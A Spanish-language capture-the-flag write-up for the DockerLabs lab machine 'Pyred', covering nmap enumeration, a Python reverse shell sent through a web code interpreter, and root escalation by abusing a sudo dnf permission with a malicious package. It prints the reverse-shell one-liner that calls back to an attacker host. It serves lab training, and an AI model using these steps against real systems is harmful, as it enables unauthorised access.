
# Writeup - PYRED

## 1. Información General

- **Plataforma**: [DockerLabs](https://dockerlabs.es/)
- **Nivel de Dificultad**: Medio
- **Sistema Operativo Detectado**: Linux
- **Fecha de Ejecución**: 02/03/2025
- **Metodología**: Enumeración → Explotación → Post-Explotación → Escalada de Privilegios

## 2. Técnicas utilizadas

- Abusar de un intérprete de Python en una página web para conseguir acceso no autorizado

- Crear un exploit en Python para automatizar el acceso (EXTRA)

- Abusar de un privilegio de **Sudoers** (Dandified Yum) con **GTFOBins** (Escalada de privilegios a root)

---

## 3. Reconocimiento y Enumeración
### 3.1. Descubrimiento de Host

Comprobamos si la máquina está activa mediante el envío de un paquete ICMP.

```
ping -c 1 <IP>
```

![[Dockerlabs/Pyred/Imagenes/1.png]]

Realizamos un primer escaneo con nmap para conocer los puertos abiertos de la máquina y volcamos el resultado en un archivo en formato "grepeable" para realizar un tratamiento mediante expresiones regulares (regex):

```
nmap -p- -sS --open --min-rate 5000 -vvv -Pn -n <IP> -oG allPorts
```

![[2.png]]

Usando una función en bash, extraemos la información mas relevante de la captura grepeable y copiamos los puertos abiertos a la clipboard mediante xclip. La función previamente defina es la siguiente:

```
# Extract nmap information:
function extractPorts(){
        ports="$(cat $1 | grep -oP '\d{1,5}/open' | awk '{prin>
        ip_address="$(cat $1 | grep -oP '\d{1,3}\.\d{1,3}\.\d{>
        echo -e "\n[*] Extracting information...\n" > extractP>
        echo -e "\t[*] IP Address: $ip_address"  >> extractPor>
        echo -e "\t[*] Open ports: $ports\n"  >> extractPorts.>
        echo $ports | tr -d '\n' | xclip -sel clip
        echo -e "[*] Ports copied to clipboard\n"  >> extractP>
        cat extractPorts.tmp; rm extractPorts.tmp      
}
```

![[3.png]]

Ahora realizamos un escaneo mas exhaustivo de los puertos:

```
nmap -sCV -p<PUERTOS> <IP> -oN targeted
```

![[4.png]]

Según vemos en el escaneo, nos encontramos ante un servicio http, por lo cual vamos a acceder a dicho servicio a través del navegador:

![[5.png]]

Si realizamos comprobaciones, veremos que estamos ante un intérprete de código python en web, por lo que podemos probar a enviarnos una shell interactiva con python:

```
import os

os.system("bash -i &> /dev/tcp/<IP>/<PUERTO> 0>&1")
```

![[6.png]]

Nos ponemos en escucha por el puerto 443 usando netcat:

![[7.png]]

Comprobamos que conseguimos el acceso:

![[8.png]]

Ahora que hemos conseguido el acceso, nuestro objetivo es convertirnos en el usuario root mediante una escalada de privilegios. Como primera enumeración, vamos a ver que permisos tenemos asignados a nivel de sudoers:

![[9.png]]

**DNF** (Dandified YUM) es un gestor de paquetes utilizado en distribuciones Linux basadas en **Red Hat** como **Fedora**, **RHEL** y **CentOS**. Sus comandos permiten instalar, actualizar, eliminar y buscar paquetes, y se gestiona de manera más eficiente los repositorios y las configuraciones personalizadas en comparación con YUM.

Buscamos en GTFObins si ese permiso asignado puede conllevar una escalada de privilegios:

![[10.png]]

Viendo que podemos conseguir la escalada por este permiso, procedemos a realizar los pasos que indica GTFObins:

![[11.png]]

En la máquina atacante:

![[12.png]]

Ahora subimos el paquete malicioso a la máquina víctima mediante http:

```
python -m http.server 80
```

![[13.png]]

Desde la máquina víctima obtenemos el recurso con curl (aseguraos de estar en un directorio donde tengáis permisos de escritura):

![[14.png]]

Realizamos el último paso de GTFObins desde la máquina víctima:

![[15.png]]

Una vez completado comprobamos los permisos de la bash y vemos que se ha aplicado el cambio de permisos:

![[16.png]]

Ahora nos mandamos una shell privilegiada y accedemos como root:

![[17.png]]


